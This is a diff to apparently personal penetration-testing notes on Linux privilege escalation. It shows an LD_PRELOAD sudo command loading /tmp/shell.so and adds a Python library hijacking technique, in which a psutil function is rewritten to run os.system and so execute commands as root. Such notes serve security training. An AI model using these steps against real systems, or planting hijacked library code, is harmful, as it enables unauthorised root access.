@@ -1009,7 +1009,7 @@ We can now use this shared object file when launching any program our user can r
 sudo LD_PRELOAD=/tmp/shell.so find
 ```
 ### Shared Object Hijacking
->Potential Target: SUID Binary payroll  
+>Potential Target: SUID Binary payroll  or user can run binary with sudo
 
 Displays the location of the object and the hexadecimal address where it is loaded into memory for each of a program's dependencies.
 ```
@@ -1048,6 +1048,51 @@ void dbquery() {
 
 gcc src.c -fPIC -shared -o /development/libshared.so
 ./payroll
+```
+### Python Library Hijacking
+>Prerequsite: suid python file or user can run python file with sudo  
+
+Priviledged Python Script
+```
+#!/usr/bin/env python3
+import psutil
+
+available_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().total
+
+print(f"Available memory: {round(available_memory, 2)}%")
+```
+Find function usage(we must have write perm over the file)
+```
+grep -r "def virtual_memory" /usr
+```
+Library Path(We must have write permissions to one of the paths having a higher priority on the list)
+>In Python, each version has a specified order in which libraries (modules) are searched and imported from. The order in which Python imports modules from are based on a priority system, meaning that paths higher on the list take priority over ones lower on the list.
+```
+python3 -c 'import sys; print("\n".join(sys.path))'
+```
+Show default package import location
+```
+pip3 show psutil
+```
+Hajacked psutil package content
+```python3
+...SNIP...
+
+def virtual_memory():
+
+	...SNIP...
+	#### Hijacking
+	import os
+	os.system('id')
+	
+
+    global _TOTAL_PHYMEM
+    ret = _psplatform.virtual_memory()
+    # cached for later use in Process.memory_percent()
+    _TOTAL_PHYMEM = ret.total
+    return ret
+
+...SNIP...
 ```
 ### Postgresql to RCE
 ```
